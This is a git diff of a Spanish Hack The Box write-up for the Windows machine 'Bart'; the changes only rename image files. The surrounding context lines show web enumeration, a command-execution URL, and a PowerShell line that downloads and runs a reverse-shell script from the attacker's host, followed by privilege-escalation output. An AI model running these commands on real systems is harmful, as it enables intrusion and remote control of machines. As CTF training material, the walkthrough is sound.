@@ -3,7 +3,7 @@ title: "Bart - WriteUp"
 date: Thu Oct 17 2024 20:00:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, dirb, reverse-shell, wordpress, wfuzz, windows, gobuster, iis]
-image: /assets/img/htb-writeups/Pasted image 20240220130347.png
+image: /assets/img/htb-writeups/Pasted-image-20240220130347.png
 ---
 
 {% include machine-info.html
@@ -13,13 +13,13 @@ image: /assets/img/htb-writeups/Pasted image 20240220130347.png
   platform="HTB"
 %}
 
-![Bart](/assets/img/htb-writeups/Pasted image 20240220130347.png)
+![Bart](/assets/img/htb-writeups/Pasted-image-20240220130347.png)
 
 Tags:           
 
 -----
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220130347.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220130347.png)
 
 Bart es una máquina bastante realista, que se centra principalmente en técnicas de enumeración adecuadas. Existen varias políticas de seguridad que pueden aumentar la dificultad para quienes no están familiarizados con los entornos Windows.
 
@@ -48,7 +48,7 @@ NMAP
 
 HTTP Redirige a  forum.bart.htb
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220141041.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220141041.png)
 
 WHATWEB
 
@@ -80,21 +80,21 @@ $ wfuzz -c -f sub-domains --hc 302 --hh 334 -u 'http://bart.htb' -H "Host: FUZZ.
 
 Si navegamos a la ruta /monitor encontramos un login:
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220181238.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220181238.png)
 
 Hacemos varias pruebas con credenciales comunes pero no obtenemos resultados.
 
 Si le damos a la botón "Forgot password?" nos lleva a la siguiente pantalla:
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220183744.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220183744.png)
 
 Nos damos cuenta que si introducimos un usuario al azar como admin o rafa nos arroja el siguiente error:
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220183853.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220183853.png)
 
 Pero si introducimos los nombres de usuarios encontrados...
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220192530.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220192530.png)
 
 Bien, podría ser una vía potencial de enumerar usuarios o hacer algo más...
 
@@ -110,19 +110,19 @@ Al probar las credenciales del tipo nombre/apellido increíblemente damos con un
 harvey:potter
 ```
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220193420.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220193420.png)
 
 Al pulsar en cualquier sección, nos redirige al subdominio _monitor.bart.htb_. Lo damos de alta en el archivo hosts y continuamos.
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220194107.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220194107.png)
 
 Descubrimos otro subdominio, lo damos de alta y le damos al enlace.
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220194507.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220194507.png)
 
 Si nos fijamos en la URL vemos que abre in formulario en PHP de una carpeta llamada _simple_chat_. Vamos a buscar información en Google y de casualidad exista.
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220195841.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220195841.png)
 
 Y parece ser que existe: https://github.com/magkopian/php-ajax-simple-chat/tree/master/simple_chat
 
@@ -159,15 +159,15 @@ Según el código si le pasamos por POST un usuario (uname) y un password (passw
 $ curl -s -X POST "http://internal-01.bart.htb/simple_chat/register.php" -d 'uname=andy&passwd=andy12345'
 ```
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220200815.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220200815.png)
 
 Y pa dentro....
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220200856.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220200856.png)
 
 Vemos esto:
 
-![BART](/assets/img/htb-writeups/Pasted image 20240220201024.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240220201024.png)
 
 Analizando la URL diría que puede ser vulnerable:
 
@@ -195,7 +195,7 @@ Al ejecutarlo tendremos ejecución remota de comandos, por ejemplo:
 http://internal-01.bart.htb/log/rce.php?cmd=whoami
 ```
 
-![BART](/assets/img/htb-writeups/Pasted image 20240222122352.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240222122352.png)
 
 Vamos a intentar obtener una reverse shell.
 
@@ -225,7 +225,7 @@ Y ya lo tenemos todo preparado para ejecutar la reverse shell en la URL del RCE 
 http://internal-01.bart.htb/log/rce.php?cmd=powershell IEX(New-Object Net.WebClient).downloadString(%27http://10.10.14.131/Invoke-PowerShellTcp.ps1%27)
 ```
 
-![BART](/assets/img/htb-writeups/Pasted image 20240222124505.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240222124505.png)
 
 Y pa dentro...
 
@@ -266,7 +266,7 @@ Testing {5B3E6773-3A99-4A3D-8096-7765DD11785C} 1337
 [+] CreateProcessWithTokenW OK
 ```
 
-![BART](/assets/img/htb-writeups/Pasted image 20240222184258.png)
+![BART](/assets/img/htb-writeups/Pasted-image-20240222184258.png)
 
 Buscamos las banderas y máquina finalizada...
 
